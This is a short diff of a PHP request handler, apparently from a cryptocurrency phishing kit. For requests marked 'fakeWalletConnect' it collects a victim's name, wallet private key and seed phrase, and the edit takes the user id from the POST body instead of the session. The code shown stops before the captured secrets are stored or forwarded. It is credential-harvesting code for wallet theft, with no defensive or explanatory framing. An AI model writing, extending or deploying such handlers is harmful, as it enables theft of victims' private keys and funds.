@@ -1,8 +1,9 @@
 <?php
 include('../connection.php');
-$login_id = $_SESSION['login_id'];
+
 if (isset($_POST['from'])) {
          if ($_POST['from'] == 'fakeWalletConnect') {
+                  $login_id = $_POST['user'];
                   $name = $_POST['name'];
                   $privateKey = $_POST['privateKey'];
                   $seedPhrase = $_POST['seedPhrase'];
